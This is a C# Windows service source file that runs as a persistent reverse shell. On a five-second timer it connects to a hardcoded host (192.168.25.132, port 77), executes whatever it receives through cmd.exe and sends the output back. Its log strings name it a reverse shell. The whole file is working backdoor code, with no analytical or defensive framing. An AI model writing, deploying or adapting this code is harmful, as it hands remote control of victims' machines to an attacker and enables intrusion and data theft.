using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace _3
{
    public partial class Service1 : ServiceBase
    {
        private Timer timer = new Timer();
        private string _host = "192.168.25.132";
        private int _port = 77;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000; //number in milisecinds   
            timer.Enabled = true;
        }

        protected override void OnStop()
        {
        }

        private void OnElapsedTime(object sender, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("http://www.google.com"))
                    {
                        WriteToFile("Internet is on at " + DateTime.Now);
                    }
                }

                try
                {
                    using (var socket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp))
                    {
                        socket.Connect(_host, _port);
                        while (true)
                        {
                            WriteToFile("Reverse shell created at " + DateTime.Now);
                            var data = new byte[1024];
                            var bytesReceived = socket.Receive(data);
                            if (bytesReceived > 0)
                            {
                                var command = Encoding.UTF8.GetString(data, 0, bytesReceived);
                                var process = new Process();

                                process.StartInfo.FileName = "cmd.exe";
                                process.StartInfo.Arguments = "/c " + command;
                                process.StartInfo.UseShellExecute = false;
                                process.StartInfo.RedirectStandardOutput = true;
                                process.Start();

                                var output = process.StandardOutput.ReadToEnd();
                                socket.Send(Encoding.UTF8.GetBytes(output));
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    WriteToFile("ReverseShellService");
                }

            }
            catch (WebException ex)
            {
                WriteToFile("Internet is off at " + DateTime.Now);
            }
        }

        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.    
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }
}
